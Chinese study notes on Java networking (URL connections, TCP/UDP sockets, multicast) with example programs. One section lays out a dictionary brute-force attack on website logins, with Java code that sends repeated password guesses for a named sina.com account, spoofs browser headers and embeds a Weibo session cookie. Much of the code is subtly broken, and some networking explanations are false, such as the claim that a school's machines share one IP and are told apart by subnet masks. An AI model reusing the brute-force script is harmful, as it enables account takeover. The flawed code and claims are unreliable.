#Java中的网络
-------------
网络已经不再是简单的通信工具，计算机已经成为网络的一部分，网络即是计算机。这个就是云计算的概念。  
移动互联网：所有的移动终端、PC端都可以通过有线、无线方式接入到互联网，扩充互联网的概念。  
物联网：要求家里的所有电器都不再是单纯的电器。它们都具有操作系统，都需要连入互联网。这种模式让互联网模式更为扩大。使所有电器都能通过网络控制。  


OSI分层：是一种非常理论化的分层，分为7层，是一个理论上的东西。  
TCP/IP分层：实际上上使用的分层。分为4层。  
物理层+数据链路层：用于传输最底层二进制。  
网络层：IP协议(Internet Protocal)，负责为网络上的节点分配唯一标识。  
传输层：TCP协议，实际上TCP协议与IP协议被一起设计出来，经常被放在一起提出。  
应用层:HTTP协议、FTP协议、SMATP协议、POP3协议，应用层的各个协议都用于不同的应用功能。  


IP地址：IP地址可以是一台PC机、一台打印机、路由器上的某一个接口。作用：为网络上的每个物理节点(广义上)分配一个门牌号。通过IP地址可以保证网络数据包能正确地找到物理节点。IPV4(32位,只有40亿个地址)与IPV6(128位，地址无数).

关于IPV4，由于总共全世界直邮40亿个IPV4地址，所以导致地址不够，这样，可能整个小区或者整个学校的校园网只有几个IP地址，这个范围内的所以机器都属于这个子网共享这几个IP地址，各机器通过子网掩码进行区分。也就是说，整个学校的机器的IP地址都是一样的，但是每一个机器的子网掩码是不同的，这样在传输数据的时候，会先通过IP地址到达本校，然后通过子网掩码在本子网的范围内找到我们要的机器。也就是说，将IP地址与子网掩码配合起来使用。  
同时，由于IPV4地址不够用，就产生了一个动态IP，对于有些机器，当其在不使用的时候，就将其IP地址分配给其他机器使用，下次使用的时候重新分配。导致这个机器的IP地址是不固定的，处于动态变化。这样的动态IP就会导致一定的问题，对于有些机器，如果IP地址改变以后就不再能被找到了。所以出现了IPV6地址，这样可以提供更多的IP地址。  

端口：对于一台机器，上面有多个应用程序在运行，每个程序在接收数据的时候，数据可以通过IP地址与子网掩码找到目的主机。但是难以找到这个主机上的目的应用程序，这样就需要端口，为每个应用程序提供接口，端口相当于这个栋楼上的某个房间号。IP地址相当于这栋楼的门牌号。  
端口的约定：0~65535个。  
其中0~1023：公用端口，我们就不要去使用了。80(HTTP)21(FTP)、110(POP)。  
1023~49151：公用程序端口。MySQL(3306),Oracle(1521)。  
49152~65535：动态分配的端口，不是给应用程序使用的。  

#Java Web编程中的地址类
InetAddress:该类代表标准IP地址，不带端口。其有两个子类，一个代表IPV6，一个代表IPV4。  
InetSocketAddress：机器上的程序的地址，包括IP地址+端口号。  

InetAddress使用：通过该类的各种方法获得这个类对象所代表的IP地址的各种属性。
InetAddress类使用示例：
>
	import java.net.*;
	public class InetAddressTest
	{
		public static void main(String[] args)  throws Exception
		{
			//this InetAddress is an address class,it represents an IP address.
			//this class provades several methods to test the IP Address features.
			InetAddress iaddr = InetAddress.getByAddress(new byte[]{(byte)218,59,(byte)186,75});
			//get the host name of this IP address
			System.out.println(iaddr.getHostName()); 
			//test the ip address is reachable, just like the cmd line: ping
			System.out.println(iaddr.isReachable(5000)); 
		}
	}


#网络编程里面的两个常用工具类
--------
URLDecoder与URLEncoder类：用于对字符串进行编码与解码。  
URLEncoder类：可以将所有“非西欧文字”编码成"%B7%E8"这样的格式。这种转换的作用是：在某些场景下，是无法传输与储存"非西欧文字"的，此时就需要使用URLEncoder这个类将"非西欧文字"(例如：中文字符)编码成西欧文字格式，再进行传输与储存。例如，Cookie的值就不能是中文。另，注意，这个转换只能转换“非西欧文字”，如果字符串中有英文，那么其中的英文是不会被转换的，而是保持原样。  
URLDecoder：可以把被URLEncoder编码后的文字转换为原来的文字。

URLEncode类与URLDecode类使用示例：
>
	import java.net.*;
	public class EncodeTest
	{
		public static void main(String[] args)  throws Exception
		{
			encode the string in sepecific charset
			String enStr = URLEncoder.encode("你好","GBK");
			System.out.println(enStr);
			String deStr = URLDecoder.decode(enStr,"GBK");
			System.out.println(deStr);
		}
	}
#网络文件地址url
------
网络文件地址URL：包括协议+IP地址+端口+要访问的文件名。  
一个url对象实际上就是一个网络上的一个文件的地址，可以通过这个地址找到这个这个文件。  
网络文件地址实际上代表的就是主机服务器上的某个文件的路径与地址。客户端可以通过一个服务器上的文件的URL向这个服务器请求这个文件。服务器发送了这个文件之后，客户端再解析这个文件，显示文件内容。例如Web编程中请求某一个jsp文件就是采用这种方式，实际上就是请求一个url例如：http：//localhost:80/index.jsp。  
URLConnection：代表一个网络文件地址连接。  
HttpURLConnection：代表一个基于Http协议的网络地址连接。  

1. 使用URL类的方法获得这个网络文件地址URL的特性。  
还可以使用openStream()方法获得与这个服务器端存放的文件的连接在一起的InputStream流对象。然后通过这个输出流对象将这个文件传输过来，也就是下载到本地，实际上这就是爬虫爬网页的操作。  
2. 另外可以通过openConnection()方法获得一个URLConnection对象，实际上就是建立与远程URL之间的连接。再通过这个URLConnection的getInputStream()方法等获得这个文件。注：在使用Http协议的时候，使用openConnection()方法获得一个URLConnection对象实际上就是HttpURLConnection连接。HttpURLConnection类是URLConnection类的子类。  
当获得了HttpURLConnection连接之后，可以模仿浏览器提交请求，模仿浏览器获取服务器的响应。

URL类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class URLTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://www.sohu.com/");
			System.out.println(u);
			System.out.println(u.getProtocol());
			System.out.println(u.getFile());
			System.out.println(u.getHost());  
>			
			InputStream is = u.openStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}  


`URLConnection`类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class URLConnectionTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://www.sohu.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
>			
			System.out.println(uc); 
			InputStream is = uc.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}

`HttpURLConnection`类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class HttpURLConnectionTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://money.163.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
			HttpURLConnection huc = (HttpURLConnection)uc;
			
			huc.connect();
			InputStream is = uc.getInputStream();
			BufferedReader br = new BufferedRe ader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}

#网站登录密码破解
------
网站登录密码破解：使用字典文件进行暴力破解。  
字典：一个文档，里面存放的是各种字符的组合，也就是有很多的字符串，在暴力破解的时候，用字典里的字符组合去依次进行输入试探，以达破解密码的目的。  

网站破解步骤：  
1. 建立`HttpURLConnection`连接。
2. 修改设置登陆页面的`Request`特性，使用`setRequestProperty()`方法设置我们自己的的请求特性(`RequestProperty`)，假装后面的请求来自正规浏览器。  
3. 设置输入、输出都为`true`。
4. 从字典文件中读取字符串。  
5. 将字符串发送到远程服务器中的登陆页面。  
6. 接收远程服务器返回的数据，查找返回数据中是否有“登陆成功”这样的字样，如果有，那么就是正确的密码。  
7. 2~6步骤进行循环，每读取一次密码组合都设置一次`Request`特性，发送一次数据，接收一次数据，比对一次收到的数据。


网站登录密码暴力破解使用示例（不完全版）：  
>
	import java.net.*;
	import java.io.*;
	public class WebsitCrackTest
	{
		public static void main(String[] args)  throws Exception
		{
			//建立一个HttpURLConnection连接
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://money.163.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
			HttpURLConnection huc = (HttpURLConnection)uc;
>			
			//读取字典文件
			BufferedReader br = new BufferedReader(new FileInputStream(new File("dic.txt")));
			String passwd = null;
			try
			{
				while((passwd=br.readLine())!=null)
				{
					//设置请求特性，假装成一个浏览器的请求特性
					huc.setRequestMethod("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
					huc.setRequestMethod("Accept-Encoding:gzip,deflate,sdch");
					huc.setRequestMethod("Accept-Language:en,zh-CN;q=0.8,zh;q=0.6,en-US;q=0.4");
					huc.setRequestMethod("Cache-Control:max-age=0");
					huc.setRequestMethod("Connection:keep-alive");
>					
					huc.setRequestMethod("Cookie:SINAGLOBAL=8825319064781.07.1403880617735; UUG=usr1024; UV5=usrmdins31284; _s_tentry=login.sina.com.cn; Apache=7425474273040.891.1404887269139; ULV=1404887269196:157:111:48:7425474273040.891.1404887269139:1404886212734; myuid=1702227501; SUB=AQPtL6KmQfJpO1wjc%2BSyogVaZLhQn4kx6f0LHxjRCB9dq1GHJxPch7QumasQfwBm5tOXmbo1e%2FljSjLyg4Ho1B%2BZRYZuyJh%2FbzgoGTrg6WBBoscISzrrpMd5AumRrEa%2Bo16ZCeavsKNzZFdyz%2B4PK2nhu6m9VizCZJKfY2e8dKZu; SUBP=002A2c-gVlwEm1dAWxfgXELuuu1xVxBxAuLIWhDMeo9gyfNEJVgSOxiuHYqW8lZpXYODHSZDM0oC_emc1AopXivJHcsb0%3D%3D; login_sid_t=0a52bcf3e3ea1e6ad50be59e449ff192; UOR=passport.weibo.com,weibo.com,login.sina.com.cn");
>					
					huc.setRequestMethod("Host:weibo.com");
					huc.setRequestMethod("If-Modified-Since:Wed, 09 Jul 2014 06:36:10 GMT");
>					
					huc.setRequestMethod("Referer:http://login.sina.com.cn/sso/logout.php?entry=miniblog&r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D%252F");
>					
					huc.setDoOutput(true);
					huc.setDoInput(true);
					huc.connect();
>					
					//打开本机的输出流，也就是远程主机的输入流,向远程主机发送数据
					PrintScream ps = new PrintStream(huc.getOutputScream());
					ps.print("username =trileverwt31204@sina.com&passwd = " +passwd);
					ps.flush();
>					
					BufferedReader br1 = new BufferedReader(new inputStreamReader(huc.getInputStream()));
					string line = null;
					while((line=br1.readLine())!=null)
					{
						if(line.contains("登陆成功"))
						{
							System.out.println("the correct passwd is : "+ line);
						}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("Error");
			}
		}
	}

`TCP`通信

`TCP`协议：如果两台计算机需要连接，那么`TCP`协议就会让他们之间建立一个连接：用于发送与接收数据的虚拟链路。见`TCP`协议图。  
实际上这条链路两端连接的东西叫：`socket`，**相当于一个插座**。客户端程序和主机端程序都是建立在`socket`之上的。在客户端，通过`TCP`协议将程序发出的信息包转换、排列、发送出去(通过`socket`)；在主机端，在`socket`收到了数据之后，也通过`TCP`协议将`socket`收到的数据转换恢复过来。也叫套接字。实际上就是**插座**的意思。   
`TCP`协议负责收集这些信息包，并将它们按适当的次序排好、通过下面的`socket`发送。在接收端的`socket`收到数据之后再通过`TCP`协议将其正确还原。  
`TCP`协议保证了数据包在传送过程中准确无误。其使用重发机制：也就是收信者接收到消息之后，需要发送确认信息。否则发送者会重复发送刚才发送的信息。通过这种机制，`TCP`协议为应用程序提供了可靠的通信连接。使其能够适应网络环境的各种变化。保证通信的可靠。
 
`TCP`通信的关键：  
1. `socket`--相当于“虚拟链路”两端的插座，其负责完成通信。  
2. `ServerSocket`--其只负责“接受”连接，用于产生`socket`。  

所以为了实现客户端与服务端的通信，两端都要有`socket`，也就是需要两个`socket`。步骤如下：  
1. 在服务器端  
a. 创建`ServerSocket`对象，但是注意，`ServerSocket`本身并不是`socket`，其不能用来通信，而是用于监听的。  
b. `ServerSocket`对象处于服务器端，该对象调用`accept()`方法后，就会一直等待，监听客户端是否发送请求。当监听到客户端的请求之后，该方法就会返回一个`socket`对象，否则就会一直处于等待状态（`accept`方法会阻塞线程）。这个就是客户端的`socket`对象，用于通信。  
创建`ServerSocket`时，使用端口有规定。  
c. 通过`I/O`流(`BufferedReader`)读取客户端发送过来的数据，也可以通过`I/O`流(使用`PrintStream`)向客户端发送数据。  
2. 在客户端  
a. 直接创建`socket`对象，参数有`IP`地址与程序端口号，`IP`地址是服务器主机的`IP`地址，程序端口号就是服务器端程序所使用的端口号。  
b. 通过`I/O`流(使用`PrintStream`)向服务器段发送数据，也可以通过`I/O`流(`BufferedReader`)从服务器端接收数据。

数据传输`socket`使用示例：  
`ClientSocket`：  
>  
	import java.net.*;
	import java.io.*;
	public class ClientSocketTest
	{
		public static void main(String[] args) 	throws Exception
		{
				try
				{
					//construct an InetAddress object
					 InetAddress iad = InetAddress.getByAddress(new byte[]{10,23,94,(byte)225});
					//connect to the server
					Socket s = new Socket(iad,30000);
>					
					//no matter when and where to output, you'd better transform the OutputStream into the PrintStream object.
					//no matter when and where to input, you'd better transform the InputStream into the BufferedReader object.
>					
					//read from the inputstream which came from the server socket.
					InputStreamReader isr = new InputStreamReader(s.getInputStream());
					BufferedReader br = new BufferedReader(isr);
					System.out.println(br.readLine());
>					
					//write into the printStream which link to the server socket
					PrintStream ps = new PrintStream(s.getOutputStream());
					ps.println("hello");
				}
				catch(Exception e)
				{
					System.out.println("error");
				}
			}	
	}


`ServerSocket`:  
>
	import java.net.*;
	import java.io.*;
	public class ServerSocketTest
	{
		public static void main(String[] args) throws Exception
			{
				ServerSocket ssc = new ServerSocket(30000); 
				System.out.println("Waiting for connections......");
				Socket sk = ssc.accept();
>				
				//no matter when and where to output, you'd better transform the OutputStream into the PrintStream object.
				//no matter when and where to input, you'd better transform the InputStream into the BufferedReader object.
>				
				//write into the printStream which link to the client socket
				PrintStream ps = new PrintStream(sk.getOutputStream());
				ps.println("hi");
>				
				//read from the inputstream which came from the client socket.
				InputStreamReader isr = new InputStreamReader(sk.getInputStream());
				BufferedReader br = new BufferedReader(isr);
				System.out.println(br.readLine());
			}	
	}


注：使用ipconfig可以查询本机IP地址，在子网中，查询的就是本机IP。如果是在公网中，那么就有自己独立的IP地址，而不是与人共用的IP地址。
在ip138上查询的是公网IP，也就是分配给学校的IP地址，公网IP地址整个学校也只有那么几个。公网IP和本机的子网掩码一起进行计算得到的就是处于子网中的本机IP地址，这个本机IP地址就是通过ipconfig命令查询而来的IP地址。

关于输入输出：  
输出时最好都转化成PrintStream进行输出(将OutputStream转化为PrintStream)，因为更方便。  
输入时最好都转化为BufferedReader进行输入(将InputStream转化为BufferedReader)，因为这样最方便。  
以上两条就是输入、输出（无论是网络还是磁盘）的最好的方法。


`UDP`协议通信  
`UDP`协议无需建立虚拟链路，其传输是不可靠的。  
A节点以DatagramSocket发送数据报(类似与集装箱)，数据报携带数据，数据报上有目标地址，大部分情况下，数据报会抵达目标地址。  
在某些时候，数据报会丢失——丢失了也不管。  
UDP协议可能出现的情况：先发送的信息，反而后抵达目的。  

常用的类：`DatagramSocket`与`DatagramPacket`。
`DatagramSocket`：相当于“码头”，用于发送、接收数据报（也就是数据集装箱）。  
`DatagramPacket`：相当于“数据集装箱”，也就是数据报。其作用是将数据装在一起。    
客户端一般不指定端口，因为不知道所需端口是否已经被占用。  
发送端：  
1. 先创建码头`(DatagramSocket`)。无需固定IP。  
2. 创建有数据、有目标地址(接收端服务器的IP地址与端口)的数据报。  
3. 发送

接收端：  
1. 创建有固定IP、固定端口的码头(`DatagramSocket`)。  
2. 创建空的数据报。  
3. 接收。
 
注意：在接收端接收到数据报之后，就可以从这个数据报中找到该数据报等待发送者的IP地址与端口。从而可以用这个IP地址向发送者返回数据报。  

UDP协议通讯与TCP协议通信的区别在于：  
TCP协议通信时，需要使用I/O来发送与读取数据。  
UDP协议通信时，不需要使用I/O来发送与读取数据。  

UDP协议使用示例：  

`UDP`一端：  
>
	import java.net.*;
	import java.io.*; 
	public class UDPBTest
	{
		final static int Server_PORT=30000;
		public static void main(String[] args) 
		{
			try
			{
				//construct client's DatagramSocket without specific port
				DatagramSocket dgs = new DatagramSocket();
				BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
				String content = null;
				while((content=br.readLine())!=null)
				{
					InetAddress iaa = InetAddress.getByAddress(new byte[]{10,23,94,(byte)253});
					//construct a DatagramPacket, it is aimed at storing the data which will be transmitted by DatagramSocket,with server's address and port.
					//the DatagramPacket should has the address and the port it aimed at
					DatagramPacket dgp = new DatagramPacket(content.getBytes(),content.length(),iaa,Server_PORT); 
					//send the data
					dgs.send(dgp); 
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}

`UDP`另一端：  
>
	import java.net.*;
	public class UDPATest
	{
		final static int MAX_SIZE=102400;
		final static int PORT=30000;
		public static void main(String[] args) 
		{
			try
			{
				//construct a DatagramSocket with specific port
				DatagramSocket dgs = new DatagramSocket(PORT);
				while(true)
				{
					//construct a DatagramPacket, it is aimed at storing the data which get by DatagramSocket
					DatagramPacket dgp = new DatagramPacket(new byte[MAX_SIZE],MAX_SIZE);
					//store the data into the DatagramPacket
					dgs.receive(dgp); 
					System.out.println(new String(dgp.getData(),0,dgp.getLength()));
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}



在使用`TCP`协议建立聊天程序的时候，需要建立一个服务器，将所有的内容进行转发到相应的客户端。  
但是在使用`UDP`协议建立聊天程序的时候，无需建立服务器，可以二者直接聊天。  


MuleticastSocket类：也是一个UDP协议，也是一个"码头",使用的时候也是需要与数据集装箱"DatagramPacket"联合使用。  
这是一个广播Socket，无需服务器。先设立一个特殊的IP地址(广播地址)，任何一个客户端向这个特殊的IP地址发送数据后，这个数据会被自动广播到所有加入了该IP地址的客户端。  
该类的方法setTimeToLive(int ttl):  

发送：  
与DatagramSocket类的使用方式是一样的，只是数据报地址是一个特殊的IP地址（广播地址）。  

接收：  
1. 要先调用joinGroup()方法加入这个广播地址。
2. 然后才能接收广播数据。

广播发送、接收使用示例：  
>
	import java.net.*;
	import java.io.*; 
	public class MultiBroadCastTest
	{
		//the default port
		final static int MULTI_PORT=30000;
		//the default IP address
		final static String CAST_IP="230.0.0.1";
		final static int MAX_SIZE=102400;
		public static void main(String[] args) throws Exception
		{
			new Thread(new SendThread()).start();
			new Thread(new RecieveThread()).start();
		}
	}
>	
	//the send thread
	class SendThread implements Runnable
	{
		public void run()
		{
			try
			{ 	
				//construct a multicastsocket
				MulticastSocket socket = new MulticastSocket();
				socket.setTimeToLive(1);
				InetAddress iaa = InetAddress.getByName(MulticastSocketSendTest.CAST_IP) ;
				BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
				String content = null;
				while((content=br.readLine())!=null)
				{
					//construct a DatagramPacket, it is aimed at storing the data which will be transmitted by DatagramSocket,with server's address and port.
					DatagramPacket dgp = new DatagramPacket(content.getBytes(),content.getBytes().length,iaa,MulticastSocketSendTest.MULTI_PORT); 
					//send the data
					socket.send(dgp); 
				}
			} 
			catch(Exception e)
			{
				e.printStackTrace();
			}
		}
	}
>	
	//the receive thread
	class RecieveThread implements Runnable
	{
		public void run()
		{
			try
			{ 
				//construct a multicastsocket
				MulticastSocket socket = new MulticastSocket(MulticastSocketSendTest.MULTI_PORT);
				InetAddress iaa = InetAddress.getByName(MulticastSocketSendTest.CAST_IP) ;
				socket.setTimeToLive(1);
				socket.joinGroup(iaa);
				while(true)
				{
					//construct a DatagramPacket, it is aimed at storing the data which get by DatagramSocket
					DatagramPacket dgp = new DatagramPacket(new byte[MulticastSocketSendTest.MAX_SIZE],MulticastSocketSendTest.MAX_SIZE);
					//store the data into the DatagramPacket
					socket.receive(dgp); 
					System.out.println(new String(dgp.getData(),0,dgp.getLength()));
				}
			} 
			catch(Exception e)
			{
				e.printStackTrace();
			}
		}
	}
TTL:控制要被发送的数据报可以跨过多少网段。
TTL=0：该数据报只能停留在本机。 
TTL=1：该数据报只能停留在当前的局域网中。  
TTL=32：该数据报只能停留在本站点的网络中。  
TTL=64：该数据报只能停留在本地区。  
TTL=128：该数据报只能停留在本大洲。  
TTL=255：这是最大的，该数据报能到达全世界。
 

注：无论是在UDP通信还是MulticastSocket广播通信，发送端的Socket对象都无需设置IP地址与Port端口；接收端的Socket对象必须设置接收Port端口。发送端的Packet对象需要设置目的IP地址与端口Port，接收端的Packer对象无需设置Port接口或者IP地址。

